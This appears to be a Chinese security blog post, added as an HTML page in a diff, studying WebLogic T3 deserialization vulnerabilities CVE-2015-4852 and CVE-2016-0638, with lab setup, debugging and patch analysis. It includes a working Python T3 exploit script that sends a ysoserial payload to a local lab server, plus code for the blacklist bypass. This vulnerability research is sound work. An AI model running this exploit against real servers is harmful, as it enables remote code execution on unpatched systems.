@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      WeblogicT3协议反序列化漏洞学习 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">WeblogicT3协议反序列化漏洞学习</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-04-04 20:58:20
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p>参考：<br><a target="_blank" rel="noopener" href="https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">Weblogic全漏洞学习 - Boogiepop Doesn’t Laugh (boogipop.com)</a><br><a target="_blank" rel="noopener" href="https://sp4zcmd.github.io/2021/07/24/Weblogic%E5%AD%A6%E4%B9%A0%EF%BC%9AT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Weblogic学习：T3反序列化 - sp4z’s Blog (sp4zcmd.github.io)</a><br><a target="_blank" rel="noopener" href="https://y4er.com/posts/weblogic-jrmp/">https://y4er.com/posts/weblogic-jrmp/</a><br>从头到尾调试了很多遍，踩了一些坑，总算理解了</p>
+<h2 id="T3协议学习"><a href="#T3协议学习" class="headerlink" title="T3协议学习"></a>T3协议学习</h2><p>T3协议是WebLogic专有的协议，类似于RMI协议，用于传输数据，会对对象进行<code>序列化和反序列化</code><br>T3协议包内容，取自于@sp4z师傅<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232000333-49b3bafe-e8c4-4a2a-ab66-21174df709b1.png#averageHue=%23a3c38c&clientId=ub4fd53c1-bdf0-4&from=drop&id=u1ecdf3b8&originHeight=163&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=115403&status=done&style=none&taskId=ucf61f1a0-4886-4f8f-a3bb-7d98c72cac5&title=" alt="Pasted image 20240402131145.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232009786-f1bde6ee-daa1-4fc3-b520-684857bbf7f2.png#averageHue=%23f2f35a&clientId=ub4fd53c1-bdf0-4&from=drop&id=ua97c48ce&originHeight=1931&originWidth=629&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2964586&status=done&style=none&taskId=uca7c6e93-29cd-438b-a3ff-5877bf57e94&title=" alt="Pasted image 20240402131152.png"><br>第二到第七部分内容，开头都是<code>ac ed 00 05</code>，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了，有两种替换方式</p>
+<ol>
+<li>将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</li>
+<li>将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</li>
+</ol>
+<p>使用脚本进行攻击</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> os <span class="token keyword">import</span> popen  
+<span class="token keyword">import</span> struct  <span class="token comment"># 负责大小端的转换  </span>
+<span class="token keyword">import</span> subprocess  
+<span class="token keyword">from</span> sys <span class="token keyword">import</span> stdout  
+<span class="token keyword">import</span> socket  
+<span class="token keyword">import</span> re  
+<span class="token keyword">import</span> binascii  
+  
+  
+<span class="token keyword">def</span> <span class="token function">generatePayload</span><span class="token punctuation">(</span>gadget<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+    YSO_PATH <span class="token operator">=</span> <span class="token string">"ysoserial.jar"</span>  
+    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'D:\jdk\jdk1.8.0_202\\bin\java.exe'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> YSO_PATH<span class="token punctuation">,</span> gadget<span class="token punctuation">,</span> cmd<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>  
+    <span class="token keyword">return</span> popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  
+  
+  
+<span class="token keyword">def</span> <span class="token function">T3Exploit</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  
+    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>  
+    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    handshake <span class="token operator">=</span> <span class="token string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>  
+    sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>handshake<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>  
+    <span class="token builtin">compile</span> <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"HELO:(.*).0.false"</span><span class="token punctuation">)</span>  
+    <span class="token keyword">match</span> <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">.</span>findall<span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>  
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Weblogic: "</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
+    <span class="token keyword">else</span><span class="token punctuation">:</span>  
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Not Weblogic"</span><span class="token punctuation">)</span>  
+        <span class="token comment"># return  </span>
+    header <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span><span class="token string">b"00000000"</span><span class="token punctuation">)</span>  
+    t3header <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>  
+        <span class="token string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span><span class="token punctuation">)</span>  
+    desflag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span><span class="token string">b"fe010000"</span><span class="token punctuation">)</span>  
+    payload <span class="token operator">=</span> header <span class="token operator">+</span> t3header <span class="token operator">+</span> desflag <span class="token operator">+</span> payload  
+    payload <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  
+    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  
+  
+  
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>  
+    ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>  
+    port <span class="token operator">=</span> <span class="token number">7001</span>  
+    gadget <span class="token operator">=</span> <span class="token string">"CommonsCollections6"</span>  
+    cmd <span class="token operator">=</span> <span class="token string">"touch /tmp/success"</span>  
+    payload <span class="token operator">=</span> generatePayload<span class="token punctuation">(</span>gadget<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>  
+    T3Exploit<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232026868-a11eca1c-0e8a-4a71-b3e5-73e1f37a6880.png#averageHue=%23fefdfd&clientId=ub4fd53c1-bdf0-4&from=drop&id=Ye1uQ&originHeight=135&originWidth=1223&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12015&status=done&style=none&taskId=ueb6d4bdb-eb98-4698-a5b2-28841e7cce6&title=" alt="Pasted image 20240402154134.png"><br>抓一下攻击流量<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232044238-6dab348b-5cfe-4a32-9d59-e6b27181d976.png#averageHue=%23f6f3f0&clientId=ub4fd53c1-bdf0-4&from=drop&id=u8afc2217&originHeight=450&originWidth=882&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74619&status=done&style=none&taskId=ud962b8a5-8f15-4b4a-8b7f-bff3be3137d&title=" alt="Pasted image 20240402155710.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232048016-e4ff62fc-5279-4400-aa8d-476cfd45ef2a.png#averageHue=%23ebe7e5&clientId=ub4fd53c1-bdf0-4&from=drop&id=u0a031224&originHeight=895&originWidth=948&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58854&status=done&style=none&taskId=u140c0bce-892b-4180-9922-0085e4927a2&title=" alt="7a456434350c5c5b45899c643a81163d.png"><br>反序列化标志，以及前面的t3协议头</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>github项目：<br><a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">QAX-A-Team&#x2F;WeblogicEnvironment: Weblogic环境搭建工具 (github.com)</a><br>weblogic和jdk下载，JDK8随便选个版本，jdk7也能跑，可以去配合jdk7u21的链子玩<br><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">Java Archive Downloads - Java SE 8 (oracle.com)</a><br><a target="_blank" rel="noopener" href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">Free Oracle WebLogic Server 12c (12.2.1) Installers for Development</a><br>在dockerfile的RUN yum -y install libnsl前添加，他没配yum源</p>
+<pre class="line-numbers language-none"><code class="language-none">RUN cd &#x2F;etc&#x2F;yum.repos.d&#x2F;  
+RUN sed -i &#39;s&#x2F;mirrorlist&#x2F;#mirrorlist&#x2F;g&#39; &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-*  
+RUN sed -i &#39;s|#baseurl&#x3D;http:&#x2F;&#x2F;mirror.centos.org|baseurl&#x3D;http:&#x2F;&#x2F;vault.centos.org|g&#39; &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>在项目中创建jdks和weblogics，把下载好的jdk压缩包和weblogic jar放进去<br>build一下，然后启动</p>
+<pre class="line-numbers language-none"><code class="language-none">docker build --build-arg JDK_PKG&#x3D;jdk-8u202-linux-x64.tar.gz --build-arg WEBLOGIC_JAR&#x3D;wls1036_generic.jar  -t weblogic1036jdk8u202 .
+
+docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk8u202 weblogic1036jdk8u202<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p>导出源码和依赖</p>
+<pre class="line-numbers language-none"><code class="language-none">docker cp weblogic1036jdk8u202:&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;middleware&#x2F;modules .&#x2F;middleware&#x2F;
+
+docker cp weblogic1036jdk8u202:&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;middleware&#x2F;wlserver .&#x2F;middleware&#x2F;
+
+docker cp weblogic1036jdk8u202:&#x2F;u01&#x2F;app&#x2F;oracle&#x2F;middleware&#x2F;coherence_3.7&#x2F;lib .&#x2F;lib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>IDEA打开wlserver文件夹，导入module和lib，添加远程JVM调试即可<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232098662-cfec1697-f716-4177-a0d9-9951e61a7804.png#averageHue=%233d4144&clientId=ub4fd53c1-bdf0-4&from=drop&id=u3b900d94&originHeight=1008&originWidth=1559&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85957&status=done&style=none&taskId=u5f8272df-e71c-40ec-ac52-50341101dcc&title=" alt="Pasted image 20240402154003.png"></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><code>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法</code><br>个人说法：readObject中会对反序列化的类进行判断，如果符合IsExternalizable就会进入readExternalData，就会调用readExternal方法，是一种另类的序列化和反序列化<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232117885-a68c33ee-77b6-470c-a3c7-2b3eafd71300.png#averageHue=%232c2b2b&clientId=ub4fd53c1-bdf0-4&from=drop&id=ue1dba3dc&originHeight=254&originWidth=764&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22414&status=done&style=none&taskId=uf16ac04e-2261-415f-8121-aad3f017e91&title=" alt="Pasted image 20240403171649.png"><br>后续会继续调用readResolve方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232179972-d0f4f22a-d6e3-4343-9e24-17bfd4342b64.png#averageHue=%232d2b2b&clientId=ub4fd53c1-bdf0-4&from=drop&id=u43691219&originHeight=536&originWidth=995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74310&status=done&style=none&taskId=ubc3f0323-031c-454b-9c9d-f81cbc96e6f&title=" alt="Pasted image 20240403182013.png"><br>配上一张图<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232189387-ec991453-f349-45a9-b890-746ea1570021.png#averageHue=%23eae9e9&clientId=ub4fd53c1-bdf0-4&from=drop&id=u53df2f52&originHeight=629&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=316603&status=done&style=none&taskId=uc61ec680-4f09-4e4e-96db-ca4b797b053&title=" alt="Pasted image 20240402171055.png"></p>
+<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>就是上面学习协议的脚本，在InboundMsgAbbrev#readObject中打上断点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232198950-f9a7f9e2-c7cd-4c3b-add7-68adad342e95.png#averageHue=%237e806e&clientId=ub4fd53c1-bdf0-4&from=drop&id=u152674ff&originHeight=522&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81488&status=done&style=none&taskId=u9f8645a5-8a76-43c3-b33b-d05c51f6682&title=" alt="Pasted image 20240402165044.png"><br>进入(new InboundMsgAbbrev.ServerChannelInputStream(var1)).readObject()<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232208436-d705a6f3-1901-4794-b391-5ba4dfc06409.png#averageHue=%232d2b2a&clientId=ub4fd53c1-bdf0-4&from=drop&id=ubf447b34&originHeight=555&originWidth=1831&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105731&status=done&style=none&taskId=u44498915-0b2e-41ef-956b-71d8bd247a7&title=" alt="Pasted image 20240402165054.png"></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">ServerChannelInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token keyword">implements</span> <span class="token class-name">ServerChannelStream</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ServerChannel</span> serverChannel<span class="token punctuation">;</span>  
+  
+    <span class="token keyword">private</span> <span class="token class-name">ServerChannelInputStream</span><span class="token punctuation">(</span><span class="token class-name">MsgAbbrevInputStream</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">super</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token keyword">this</span><span class="token punctuation">.</span>serverChannel <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getServerChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">public</span> <span class="token class-name">ServerChannel</span> <span class="token function">getServerChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>serverChannel<span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Class</span> var2 <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"super.resolveClass returns null."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
+            <span class="token class-name">ObjectStreamClass</span> var3 <span class="token operator">=</span> <span class="token class-name">ObjectStreamClass</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> var3<span class="token punctuation">.</span><span class="token function">getSerialVersionUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> var1<span class="token punctuation">.</span><span class="token function">getSerialVersionUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"different serialVersionUID. local: "</span> <span class="token operator">+</span> var3<span class="token punctuation">.</span><span class="token function">getSerialVersionUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" remote: "</span> <span class="token operator">+</span> var1<span class="token punctuation">.</span><span class="token function">getSerialVersionUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">return</span> var2<span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+        <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看见继承了ObjectInputStream,构造函数调用了父类的方法，并且实现了resolveClass<br>resolveClass中并未添加相关黑名单，只是对是否class是否为null和SerialVersionUID进行了检查，所以就可以打任意的反序列化链，而在weblogic中是自带cc3.2.0的，我们就可以打cc链<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232227764-eb0c2bb7-a28c-453f-961b-1e2d83e88b19.png#averageHue=%23e2bc84&clientId=ub4fd53c1-bdf0-4&from=drop&id=u941bdd12&originHeight=421&originWidth=1185&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61047&status=done&style=none&taskId=u8943ba4d-eeb6-4e45-93f0-d0c0e9aecae&title=" alt="Pasted image 20240402165555.png"><br>附上攻击调用图，从师傅博客里扒的，这里我就不多说了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232247312-ce105543-9e60-4851-aa58-a82248c63b0c.png#averageHue=%23f7f6f6&clientId=ub4fd53c1-bdf0-4&from=drop&id=u892ced88&originHeight=564&originWidth=801&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91496&status=done&style=none&taskId=ua68ec991-cd59-44a3-8669-698deca20e1&title=" alt="Pasted image 20240402165654.png"></p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>漏洞的修复就是在resolveclasss中添加了黑名单<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232255544-3e3a5d66-5532-41bd-a319-569d4c36816d.png#averageHue=%23f6f6f6&clientId=ub4fd53c1-bdf0-4&from=drop&id=ue22a4b84&originHeight=907&originWidth=1257&originalType=binary&ratio=1&rotation=0&showTitle=false&size=324652&status=done&style=none&taskId=u172bb5dc-f50c-4a5f-8773-dc3d3f7ce66&title=" alt="Pasted image 20240402165838.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232264720-e9a341dd-186f-4258-97d1-0797564b76d7.png#averageHue=%23232221&clientId=ub4fd53c1-bdf0-4&from=drop&id=u18b0f96b&originHeight=460&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=155263&status=done&style=none&taskId=u149ab95b-56aa-4709-8a0a-045896d3f95&title=" alt="Pasted image 20240402170708.png"></p>
+<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>对于上一个漏洞修复的bypass，最终找到了StreamMessageImpl#readExternal，符合IsExternalizable<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232302196-b712a6ad-d9da-415d-8f1b-0e57e63beda8.png#averageHue=%232f2d2c&clientId=ub4fd53c1-bdf0-4&from=drop&id=ud2c8a6ea&originHeight=234&originWidth=1562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40184&status=done&style=none&taskId=u9e380e52-35f2-4a45-ae7e-01f35c7c510&title=" alt="Pasted image 20240403171921.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232304724-89f22bec-d5d4-47e3-ac97-dfa11fb5018f.png#averageHue=%232f2b2a&clientId=ub4fd53c1-bdf0-4&from=drop&id=ud401f14d&originHeight=370&originWidth=981&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59315&status=done&style=none&taskId=uf0f1a036-21d2-4cf0-83e1-a6d13a95cea&title=" alt="Pasted image 20240402211727.png"><br>并且其readExternal方法会对var5调用readObject，从而造成二次反序列化，想要使用还需要对StreamMessageImpl#writeExternal进行修改<br>参考项目:<br><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">5up3rc&#x2F;weblogic_cmd: weblogic t3 deserialization rce (github.com)</a></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">writeExternal</span><span class="token punctuation">(</span><span class="token class-name">ObjectOutput</span> paramObjectOutput<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">writeExternal</span><span class="token punctuation">(</span>paramObjectOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    paramObjectOutput<span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//var1.readByte() </span>
+    paramObjectOutput<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token function">getDataSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//createPayload中</span>
+    paramObjectOutput<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">getDataBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//this.payload.getInputStream</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232384255-e087f1a8-d7e0-4809-b416-caa10bf84103.png#averageHue=%232e2d2c&clientId=ub4fd53c1-bdf0-4&from=drop&id=uab377761&originHeight=239&originWidth=1636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79892&status=done&style=none&taskId=u3d2346ab-4065-4114-bd91-c2a4ad4b145&title=" alt="Pasted image 20240403174049.png"><br>附上攻击图<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35213294/1712232390010-7cecb5a0-c86b-4d20-b1be-be9b00ebb459.png#averageHue=%23fafafa&clientId=ub4fd53c1-bdf0-4&from=drop&id=u5650ecd3&originHeight=603&originWidth=489&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19089&status=done&style=none&taskId=u333eef29-defd-446e-ab4a-1673621b64d&title=" alt="Pasted image 20240403170842.png"></p>
